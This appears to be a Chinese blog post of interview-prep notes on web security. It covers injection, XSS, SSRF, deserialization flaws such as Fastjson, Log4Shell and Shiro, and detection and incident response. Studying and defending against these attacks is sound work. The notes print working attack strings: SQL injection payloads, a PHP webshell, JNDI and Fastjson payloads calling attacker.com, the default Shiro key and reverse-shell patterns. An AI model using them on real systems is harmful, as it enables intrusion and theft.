---
title: 网络安全面经
date: 2026-05-08
summary: 网络安全常见的面试内容
tags:
  - Security
  - 面经
draft: false
toc: true
---
# 基础漏洞知识

## Injection/注入

**Q：什么是SQL注入**

A：应用程序将用户输入的数据，直接拼接到 SQL 语句中执行，攻击者可以构造恶意 SQL 语句，从而绕过认证、获取数据库数据、修改数据，甚至控制服务器。

**Q：原理是什么**

A：

```sql
### SQL代码
SELECT * FROM users 
WHERE username = 'admin' 
AND password = '123456'

### 拼接语句
sql = "SELECT * FROM users WHERE username='%s' AND password='%s'" % (user, pwd)

### 进行注入
admin ' OR '1' = '1

### 注入结果
sql = "SELECT * FROM users WHERE username='admin' OR '1' = '1'"

WHERE username = 'admin' OR '1' = '1'
AND password = ''

语句判断永远为真 所以执行成功
```

**Q：注入有哪些类型**

A：

联合查询注入： `union select database(),user()`

​	核心条件：UNION 前后的 SELECT 字段数量必须一致

```sql
SELECT id, username FROM users WHERE id = 1
UNION SELECT 1, database();
```

主要看三件事：

1. **原查询有几列**
2. **哪些列会回显到页面**
3. **能不能用 UNION SELECT 拼接额外查询**

使用场景：商品详情页，用户信息页



报错注入：updatexml() ；extractvalue()

有些数据库函数在报错时，会把查询结果带到错误信息里。攻击者就可以故意构造错误，让数据库把想查的数据“塞进报错内容”。

```sql
SELECT updatexml(1,concat('~',database(),'~'),1);
# 可能结果：XPATH syntax error: '~testdb~'
and extractvalue(1,concat(0x7e,(select database())))
```

主要看两件事：

1. **应用是否把数据库错误直接返回给前端**
2. **数据库错误信息中是否能包含查询结果**



盲注：

​	时间盲注：`and if(substr(database(),1,1)='a',sleep(5),1)`

​	布尔盲注：`and substr(database(),1,1)='a'`

```sql
1）substr()函数
string substr(string,start,length)第一个参数为要处理的字符串 start为开始位置 length为获取到的长度
2）Left（）函数
Left ( string, n ) string为要获取的字符串 n为长度
3）ORD()函数
ord()函数同ASCII（），将字符转为ascii 此函数为返回第一个字符的ASCII码 经常与上面的函数进行组合使用
```



堆叠注入：`1'; drop table users#` 部分数据库支持

宽字节注入：某些编码一个汉字占两个字节，addslashes()被绕过

**Q：SQL注入如何绕过WAF**

A：

白盒：代码审计

黑盒：

架构层面，寻找源站点地址，适用于使用了云WAF，利用同网段或服务器进行注入

资源限制角度：发送大文件绕过

协议方面：比如只对get过滤或对某一种文件过滤

规则层面的绕过：注释绕过，url编码绕过，特殊字符绕过，%0a绕过，空字节%00

**Q：单引号过滤怎么办**

A：转换成url编码 或者16进制 或者其他的编码方式

**Q：SQL写WebShell的方式**

A：select ... into outfile   或者 SQLmap --os --cmd 或者 --os-shell

secure_file_priv配置不当，函数功能（限制往指定目录写文件）

`secure_file_priv=/var/mysql-files/` 

**Q：SQL无回显的情况下如何得到数据**

A：时间盲注、DNSlog

攻击者准备DNSlog域名，诱导目标服务器发DNS请求，看解析结果，如果有解析结果 说明成功触发

**Q：基于Cookie怎么注入**

A：sql的注入本质是用户可控输入进行注入，cookie也属于用户可控输入。可以修改uid，rememberme，role

**利用：**

1. 登录绕过
2. 数据泄露
3. 数据篡改

**防御：**

1. 参数化查询（预编译）
2. 正则表达式过滤
3. 开启魔术引号
4. 加装WAF等
5. ORM（Object Relational Mapping，对象关系映射）

## XSS

**Q：什么是XSS？**

A：跨站脚本攻击。攻击者将恶意 JavaScript 注入网页，当其他用户访问页面时，脚本会在浏览器执行。

**Q：有哪些类型？**

A：

反射型XSS：`http://test.com?q=<script>alert(1)</script>`

一般需要诱导用户点击，服务器直接返回



存储型XSS：存入数据库，用户访问页面时自动执行；从评论区 留言版等存入



DOM型XSS：`document.write(location.hash)`用户输入直接进入页面

`https://example.com/profile#<img src=x onerror=stealCookie()>`

```
攻击者传播“恶意 URL”
↓
受害者浏览器执行前端 JS
↓
前端 JS 把恶意内容插入 DOM
↓
浏览器执行恶意代码
```

利用：

```bash
1. 窃取cookie，`document.cookie / Javascipt`如果cookie没有设置HttpOnly，会被截取session和登录态
2. 会话劫持，直接接管用户账号，应用于管理员后台，OA系统等，评论区或其他地方插入 诱使管理权限的用户进行点击
3. 页面钓鱼，XSS动态修改页面DOM，例如插入假的登录框；修改支付页面；模拟系统提示
4. 键盘记录，`keydown`
5. 内网探测，需要受害者在企业内网。`fetch("http://192.168.1.1")`
6. 恶意跳转，`location.href="恶意网站"`
```

防御：

1. 输出编码：将`<script>alert(1)</script>` 转义为`&lt;script&gt;alert(1)&lt;/script&gt;` 
2. 白名单过滤
3. 过滤JavaScript事件的标签
4. 开启Http-only



## XXE（XML外部实体注入）

XML：一种结构化标记语言

```xml
<user>
    <name>admin</name>
</user>
```

应用解析 XML 时，允许 XML 实体引用外部资源，攻击者借此读取文件、发起请求甚至攻击内网。

XML中有Entity，类似于变量

```xml
<!ENTITY name "hello">
<user>&name;</user>
<user>hello</user>
```

除了普通字符串，XML还能引用：文件、URL、网络资源

`<!ENTITY test SYSTEM "file:///etc/passwd">` 

利用：找到XML输入点(XML API;文件上传;Office 文档;SVG) -> 插入恶意实体 -> 引用实体 -> 服务器解析xml

1. 读取服务器文件
2. SSRF：`<!ENTITY xxe SYSTEM "http://127.0.0.1:8080">`
3. 无回显XXE：通过DNS HTTP带出数据

修复：

使用语言中推荐的禁用外部实体的方法

1. PHP：libxml_disable_entity_loader(true);
2. Java:
   1. DocumentBuilderFactory  dbf =DocumentBuilderFactory.newInstance();
   2. dbf.setExpandEntityReferences(false);

3. Python:
   1. from lxml import etree
   2. xmlDataetree.parse(xmlSource,etree.XMLParser(resolve_entities=False))

手动黑名单过滤：过滤 XML 中的相关关键词，比如：<!DOCTYPE、<!ENTITY SYSTEM、PUBLIC 等。

### XXE和XML注入的区别

XML注入：用户输入破坏XML结构

```xml
<user>
    <name>USER_INPUT</name>
</user>

# 用户输入 tom
# 生成 <name>tom</name>

# 如果输入
<name><admin>true</admin></name>
# 最终被改写
```

XML会导致：

1. 权限绕过
2. 数据篡改
3. SOAP请求污染：**Simple Object Access Protocol**（简单对象访问协议

## CSRF

攻击者诱导用户访问恶意页面，利用用户已经登录的身份，向目标网站发送请求。

浏览器携带cookie，服务器没有验证请求是否合法

种类：

GET：主要利用图片、链接等标签的src属性来触发

POST：提交表单或请求

Jsonp：利用JSONP跨域特性进行攻击

修复：

1. CSRF Token：服务器给每个用户Token并绑定session，
2. SameSite Cookie：
   1. None：不限制
   2. Lax：部分跨站不带
   3. Strict：完全禁止跨站携带
3. Origin/Reference：请求来源不同，但是也可能不生效（隐私设置，浏览器不发送
4. 双重Cookie：浏览器能自动带Cookie但是不能读取内容，访问时再提交一下cookie，攻击者不知道
5. 二次验证 / 用户交互确认
6. JWT（JSON Web Token）：不会主动携带 可以防范CSRF

## SSRF

服务器端请求伪造

攻击者可以借目标服务器的身份、网络位置、权限，去访问它能访问的资源。

很多服务需要根据用户提供的URL 主动发请求 `requests.get(user_url)`

服务器能访问一些攻击者访问不到的，如：内网、localhost、Docker

利用：

1. 内网探测：端口、后台、管理接口（Redis，Docker API），通过响应时间、返回内容判断哪些端口开放
2. 访问localhost：127.0.0.1
3. 读取云Metadata，如AWS：`http://169.254.169.254`。可获取临时云凭证，接管云资源
4. 协议利用：file:// ; ftp:// ; gopher://(构建原始TCP请求) 等
5. Redis / FastCGI攻击
6. 无回显SSRF（DNS回连、HTTP回连、时间差）

修复：

1. 不要让用户决定服务器访问哪里
2. 白名单机制
3. 禁止内网IP
4. 禁止危险协议，只允许http / https
5. DNS固定解析：防止请求时重新解析
6. 最小权限原则
7. 网络层隔离：Redis 不开放；Docker API 不开放；Metadata 限制

## RCE

远程代码执行

利用：

1. 命令执行漏洞 `os.system("ping " + ip)` ，输入` 127.0.0.1; whoami` 。最终执行第二条
2. 常见危险函数

```php
system() # 调用系统shell执行命令
exec() # 不直接输出 保存在数组
  # 利用：exec($_GET['cmd']);  ?cmd=cat /etc/passwd
    
shell_exec() # 通过 Shell 执行命令，并将完整输出作为字符串返回
  # 利用：echo shell_exec($_GET['cmd']);  ?cmd=uname -a
  
passthru() # 执行外部程序，并将原始输出直接传递到浏览器/终端。
  				 # 通常用于二进制流或需要原样输出的场景。
```

```python
os.system() # 调用系统shell执行命令
subprocess.Popen(shell=True) # 这是更底层、更强大的进程控制方式
```

```java
Runtime.getRuntime().exec() // 启动一个新的系统进程
```

3. 文件上传 -> WebShell
   1. ` <?php system($_GET['cmd']); ?>` 

4. 反序列化RCE：反序列化攻击者可控数据
   1. Java : ReadObject / ObjectOutPutStream
   2. PHP : unserialize
   3. Python : pickle.loads
5. 及时更新组件：Log4j，Struts2，Fastjson
6. 代码审计、输入验证、参数化查询、使用安全的API、限制文件权限



## 文件操作

### 文件上传

正常上传只存储文件。如果文件类型检验不严格，服务器解析配置错误，上传目录可执行

上传恶意脚本文件

利用：

1. 上传WebShell：`<?php system($_GET['cmd']); ?>` 
2. 前端校验绕过：抓包改需求
3. MIME类型绕过：服务器只检查Content-Type，攻击者改成image，实际上传php
4. 文件后缀绕过
   1. 大小写 .pHp
   2. 双后缀 shell.php.jpg
   3. 空格 shell.php%20
   4. Shell.php.
5. 解析漏洞利用：如shell.php.jpg。部分中间件可能按php执行
6. 图片马
7. 审查上传点的元素：如果在前端限制上传文件类型 直接增加类型

```shell
GIF89a
<?php ... ?>
如果服务器后续包含/解析文件 可能导致RCE
```

### 文件下载

```shell
/download?file=xxx
../../etc/passwd
任意文件读取，属于路径穿越
```

修复手段：

1. 白名单校验
2. 服务端校验，不能只靠前端JS
3. 校验真实文件内容，不能只看后缀 、 MIME
4. 随机文件名
5. 限制文件大小
6. 隔离存储 对象存储（OSS）
7. 最小权限原则
8. WAF

## 越权漏洞

### 水平越权

同权限级别的用户，能够访问或操作其他用户的数据。

- 系统只验证了“是否登录”
- 没验证“这个资源是不是你的”

利用方式：

1. 修改ID参数：`GET /api/user/1/profile` -> `GET /api/user/2/profile`
2. 修改Cookie / JWT的用户标识
3. 越权修改数据

```json
POST /api/edit
{
  "user_id":2,
  "nickname":"hack"
}
```

4. 下载接口越权：`/download?file=report_1002.pdf`

防范：

1. 服务端做资源归属校验

```python
order = Order.get(id=order_id)

# 正确
order = Order.get(
    id=order_id,
    user_id=current_user.id
)
```

2. 不信任前端传输的user_id

```python
user_id = request.json["user_id"]

# 正确
user_id = session.user.id
```

3. 接口统一鉴权中间件：ACL（Access Control List）RBAC（Role-Based Access Control）

### 垂直越权

低权限用户获取高权限用户能力

利用：

1. 直接访问管理员接口

```html
例：/admin/deleteUser
前端进行了隐藏按钮，但是后端没有校验权限
```

2. 修改角色字段

```json
{"role":"admin"}
```

```http
POST /updateProfile
{
  "is_admin":1
}
```

3. 篡改JWT（json web token)

```json
{"role":"user"} --> {"role":"admin"}
```

4. 功能隐藏 ≠ 权限控制

防范：

1. 后端强制RBAC权限控制

```python
if current_user.role != "admin":
    return 403
```

2. JWT正确校验
   1. 验证签名
   2. 校验exp
   3. 禁止alg = none
3. 敏感操作二次验证

## 未授权访问

系统没有进行身份认证或权限校验，导致任何人都能直接访问敏感资源

利用：

1. 管理后台未授权：`http://example.com/admin`
2. API未授权：`GET /api/users` 返回username , password
3. 数据库未授权：Redis（6379）、MongoDB
4. 文件目录未授权：目录遍历
5. Swagger / Actuator 未授权：暴露接口文档、环境变量、数据库配置

Redis：

1. redis以root身份运行，config set。内容为SSH公钥内容 文件路径满足公钥存放的位置 就可以给root账户写入SSH公钥文件，通过ssh登录目标服务器
2. 同上，知道了网站路径后，config set，内容为一句话木马。
3. 不知道网站绝对路径时，利用linux的定时任务：Linux会监测/etc/crontab的内容，将反弹shell的命令使用redis备份到/etc/crontab

修复：

1. 禁止外部访问Redis服务端口
2. 禁止使用root权限启动redis
3. 配置安全组，限制可连接Redis服务器的IP

## 目录遍历

用户输入的文件路径未做安全校验

```python
filename = request.GET["file"]
open("/var/www/uploads/" + filename)

# 用户上传
../../etc/passwd
#最终
open("/var/www/uploads/../../etc/passwd")
--> open("/etc/passwd")
```

利用：

1. 文件读取
2. 读取配置文件
   1. config.php / .env
   2. application.yml / application.properties
   3. settings.py
3. 配合文件包含漏洞
4. 碰到过滤 怎么绕过
   1. URL 编码绕过
   2. 多写绕过：`replace("../","")` 写入 `....//`

防范：

1. 不允许用户控制路径，如`open("/upload/" + filename)`
2. 白名单，访问指定文件
3. 路径规范化
4. 禁止访问敏感目录


## 弱口令

使用过于简单、容易猜测或常见的密码，导致攻击者能够通过爆破、字典攻击等方式登录系统。

利用：

1. 字典攻击
2. 暴力破解
3. 社工

修复：

1. 设置复杂密码策略
2. 限制登录次数
3. MFA多因素认证
4. 强制修改默认密码
5. IP限制

# 反序列化漏洞

## 什么是序列化？为什么要序列化

序列化：把内存中的对象，转换成可以传输、存储的字符串或字节流。

反序列化：把这些字符串/字节流，再恢复成对象。

通俗的来说，序列化 = “打包”，反序列化 = “拆包”

序列化 就是把对象打包成：JSON ; XML ; 二进制

反序列化 就是把这些数据重新恢复成对象

## 为什么会出现反序列化漏洞

很多语言/framework：

在反序列化过程中：

- 自动调用构造方法
- 自动调用魔术方法
- 自动执行对象逻辑

程序把外部传入的数据还原成对象时，过度信任了数据内容，导致攻击者可以构造恶意对象，让程序执行非预期逻辑，甚至命令执行。

## PHP反序列化

```php
serialize();
unserialize();
  
# 如果后端对用户输入的数据执行
unserialize($_COOKIE['data']);

# 反序列化时可能会触发一些魔术方法
__wakeup()
__destruct()
__toString()
__call()
__get()
```

举例利用：

```php
class User {
    public $file;

    function __destruct() {
        unlink($this->file);
    }
}
```

如果攻击者控制$file 就可能删除指定文件

防范：

1. 改用json，不要直接对用户的输入unserialized
2. 如果必须使用，限制可反序列化的类
3. 避免在魔术方法中写危险操作

## Java反序列化

```java
ObjectInputStream.readObject()
```

Java一般利用方法：Gadget Chain 利用链

攻击者一般不能直接给服务器发数据，利用项目已有依赖包中的多个类 拼接成一条调用链 最终触发危险行为

常见的包括

```bash
Commons Collections
Commons BeanUtils
Spring
Groovy
Hibernate
Fastjson
Jackson
XStream
```

### ysoserial 是什么

`java -jar ysoserial.jar CommonsCollections6 calc.exe > payload.bin`

一种生成恶意序列化数据的工具

## Python反序列化

```python
pickle
pickle.loads(user_input)
# pickle 在反序列化时可以恢复复杂对象，并且可能触发对象中的特殊方法

# 常见危险场景
pickle.loads(request.data)
```

## WebLogic

Oracle是Java的企业级中间件

WebLogic有很多组件：

```bash
T3
IIOP
XMLDecoder
SOAP
反序列化接口
```

很多接口会：

- 接收外部对象
- 自动反序列化
- 自动解析 XML

攻击流程：

```python
扫描 WebLogic 端口
确认版本
利用 T3/IIOP/XMLDecoder
发送 payload
执行命令
上传 webshell
控制服务器
```

常见端口：7001 ; 7002

## Fastjson

原理：Fastjson有个危险功能（AutoType

```json
{
  "@type":"com.xxx.Class"
}
```

能够自动指定化的类，例如

```json
{
  "@type":"com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName":"rmi://attacker.com/exp",
  # 这里是主动到攻击者服务器下载恶意class 然后执行
  "autoCommit":true
}
```

解析后：

1. 实例化JdbcRowSetImpl
2. 访问恶意LDAP
3. LDAP返回恶意类
4. JVM加载恶意类
5. RCE

## Struts2

Apache Struts  Java web框架

```bash
用户请求
→ Struts2 Filter
→ Interceptor 拦截器
→ Action 执行业务逻辑
→ Result 返回页面
```

漏洞：OGNL表达式 + 参数自动绑定

OGNL：Object-Graph Navigation Language 对象图导航语言，可以访问 Java 对象属性、调用方法、操作上下文。

```bash
user.name
# 表示访问
user.getName()
```

OGNL 是为了方便 JSP 页面取值，如果攻击者能控制 OGNL 表达式，并让框架执行，就可能造成严重后果。

1. OGNL表达式注入：如果用户输入进入 OGNL 解析流程，就可能导致表达式执行
2. 文件上传漏洞：可能会导致
   1. 任意文件上传
   2. 路径穿越
   3. 上传WebShell
3. 参数绑定导致对象污染，如果绑定范围控制不当 可能修改不该修改的属性

## Log4Shell

大量的Java项目都会记录日志，核心问题：Log4j支持“日志中的变量解析”

```java
logger.error("${java:version}");
// Log4j会自动解析Java版本
```

不仅支持变量解析 还支持JNDI lookup

JNDI : Java 提供的一套“查找资源”的统一接口

LDAP：Lightweight Directory Access Protocol **轻量级目录访问协议**

```java
// 利用
logger.error(username);
// 攻击者输入
${jndi:ldap://attacker.com/a}；
// LDAP返回恶意类引用
// JVM下载恶意类
```

很多地方都需要记录日志：

1. User-Agent
2. X-Forwarded-For
3. Username

防范：升级Log4j；禁用JNDI Lookup

## Shiro漏洞

Apache Shiro是Java安全框架，主要功能有：

1. 登录认证
2. 权限控制
3. Session管理
4. RememberMe

### Shiro 550

Shiro 有 RememberMe 功能。用户登录后，服务器会生成：rememberMe Cookie

Cookie的内容本质上是序列化后的对象，然后AES加密

问题：Shiro 默认 AES Key 是公开固定的（kPH+bIxk5D2deZiIxcaaaA==

```bash
# 利用
1. 构造恶意序列化对象：ysoserial 生成 gadget
2. 用默认AES Key加密
3. 放进rememberMe Cookie。Cookie: rememberMe=xxxxx
4. Shiro解密并反序列化
```

550容易被爆破，因为很多系统会修改默认Key，攻击者对Key进行爆破

如果 rememberMe=deleteMe 说明Key成功

### Shiro721

```bash
# 550和721的区别
Shiro550只需要通过碰撞key，爆破出来密钥，就可以进行利用
Shiro721的ase加密的key一般情况下猜不到，是系统随机生成的，并且当存在有效的用户信息时才会进入下一阶段的流程所以我们需要使用登录后的rememberMe Cookie，才可以进行下一步攻击
```

# 中间件漏洞



# 信息收集

### 子域名泛解析

**原因：**将没有明确设置的子域名一律解析到一个IP地址，造成都能访问的假象

ping一个不存在的域名 发现能解析时，说明使用了泛解析

**解决方法：**

IP黑名单：随机访问不存在的域名，通过返回结果分析是否存在泛解析。如果确定存在，使用脚本工具 OneForAll

HTTP Host：DNS能解析，但是`Host:random.example.com` 返回404 说明不是真实业务

# 流量分析

## 黑链

本质上是一种“非法 SEO 利用 + Web 入侵”行为。攻击者通过获取网站权限，在受害网站中隐藏插入指向赌博、色情、博彩等站点的链接，借助高权重网站提升目标站点搜索引擎排名。

SEO：Search Engine Optimization，搜索引擎优化

黑链的核心目标：

1. 借助高权重网站传递 SEO 权重
2. 提高恶意站点在 Google / 百度等搜索引擎中的排名
3. 获取流量变现
4. 用于灰黑产引流

典型表现：

- 网站源码中出现隐藏链接
- 搜索引擎快照中出现博彩关键词
- 首页被植入大量不可见 `<a>` 标签
- 搜索 `site:xxx.com` 出现异常标题
- 页面底部隐藏日文/博彩/色情关键词

### 常用植入方式

1. HTML明文植入

```html
<div style="display:none">
<a href="http://xxx.com">博彩</a>
</div>
```

2. CSS隐藏

```html
<a href="http://xxx.com"
style="position:absolute;left:-9999px">
博彩
</a>
```

3. JS动态生成

```javascript
document.write('<a href="http://xxx.com">博彩</a>')
eval(atob("base64编码"))
```

避免管理员发现 ； 绕WAF

4. 判断User-Agent

```php
if(strpos($_SERVER['HTTP_USER_AGENT'],'Baiduspider')){
    echo '<a href=...>';
}
# 看不到异常
# 管理员也不一定能发现
# 百度等爬虫可以发现
```

5. iframe黑链

```html
<iframe src="http://evil.com" width=0 height=0></iframe>
```

6. 数据库存储型黑链

```sql
UPDATE article SET content=content+'黑链代码'
```

### 如何植入

黑链是 漏洞利用后的行为，常见方式有

1. 弱口令
2. 文件上传
3. SQL注入
4. RCE
5. CMS漏洞

### 如何监测

1. 搜索引擎监测

```bash
site:example.com
site:example.com 博彩
# 如果有 基本中了
```

2. 查看网站源码

```html
display:none
iframe
base64_decode
```

3. 爬虫模拟

```bash
curl -A "Baiduspider" http://xxx.com
# 很多只对搜索引擎显示
```

4. 检查文件完整性

```bash
find . -mtime -1
# 重点检查
1. 最近修改文件
2. 异常PHP文件
3. footer.php
4. index.php
```

## 恶意代码特征

### SQL

短时间高频异常：500 403等

参数熵异常：id等参数编码复杂度提升

### XSS

流量特征会出现HTML / JS标签 ； URL编码等

DOM XSS：`/#<script>alert(1)</script>`

XSS外联特征：`<script src=evil.com/x.js>`

运营侧表现为：页面加载未知域名JS

### 文件上传

1. Content-Type异常：image/jpeg  ->  application/x-php
2. 双扩展名
3. MIME伪造：Content-Type:image/jpeg 内容：`<?php system($_GET['cmd']); ?>`
4. 文件头不一致：JPEG本来是FFD8FF，实际`<?php`
5. webshell特征

```php
eval($_POST['x']);
assert($_POST);
system($_GET['cmd']);
```

6. 上传后的访问

```bash
POST /upload.php
GET /uploads/shell.php
```

### RCE 流量特征

```bash
# Linux
whoami
id
uname
cat /etc/passwd

# Windows
cmd.exe
powershell
dir
```

命令拼接符

```bash
;  &&  |  ||
ip=127.0.0.1;cat /etc/passwd
```

反弹Shell特征

```shell
# Bash TCP
bash -i >& /dev/tcp/
# nc
nc -e /bin/bash
# powershell
powershell -enc
```

Base64编码

`echo xxx | base64 -d | bash`

### WebShell通信流量特征

1. 小POST大响应：POST只有几十字节 大量命令执行结果
2. 参数熵高：pass=ajsdhaskdh123123
3. 加密通信
4. 固定URI：

```bash
/1.php
/images/1.php
/upload/xx.php
# 频繁POST
```



### SSRF流量特征

1. 参数中出现URL：`url=http://127.0.0.1`
2. 内网地址
3. 云Metadata：`169.254.169.254` ; `/latest/meta-data/`

### 目录遍历流量特征

../ 或者编码后的 ../

# 网络知识

# 数据库安全

# 系统安全

# 云安全

# 日志分析

# 常见安全设备

# 应急响应

### 说一次应急响应的案例

在企业的Linux Web服务器上，对外提供Java Web服务。

1. SOC平台告警发现疑似WebShell上传，服务器出现了CPU异常升高，对外异常连接，新增可疑进程。
2. 查看流量 发现可疑IP访问，隔几十秒进行请求。请求体中被base64编码，发现是system
3. 登录服务器，查看web目录，发现一个jsp后缀的文件。cat命令打开 发现是命令执行WebShell。通过看Tomcat的日志，发现`POST /shell.jsp?cmd=whoami`以及IP
4. bash查看history，然后看异常进程`ps aux`发现了挖矿进程
5. Netstat -antp 发现外联了境外IP。

上传接口的文件类型校验做的不好，被绕过了。立马隔离主机，删除文件 清理进程。查看有没有定时任务，修改账号密码。没有内网移动

# 真实面试

### 2026-05-13 北京作业帮 - 安全运营实习

1. 自我介绍
2. SQL有哪些注入方式，盲注原理
3. CSRF SSRF 原理及区别
4. HTTP / HTTPS区别
5. OSI，TCP/IP网络模型分别是什么
6. 对哪些漏洞有了解（反序列化
   1. Log4shell 讲讲 Log4j原理
   2. Shiro 550 / 721 两者区别
7. 做过护网 负责什么？（流量审计 or 日志审计 or ···
   1. 说做过流量，具体说一下有什么印象深刻的case（说的是主机侧
   2. 追问：做的流量审计，但是说的是主机侧 怎么判断是被攻击了

### 2026-05-14 西安奇安信 - 安全运营实习生

1. 自我介绍
2. SQL原理 有哪些方式 怎么防御
3. XSS有哪些方式 原理 区别
4. CSRF原理 防御 SSRF区别
5. HTTP协议怎么发包 过程
6. 护网经历 干什么了
7. 挂马都有哪些类型（黑链的应用方式
8. 渗透测试的流程 用过哪些工具
9. Linux提权方式
10. 对SQL了解吗 平常用的多吗
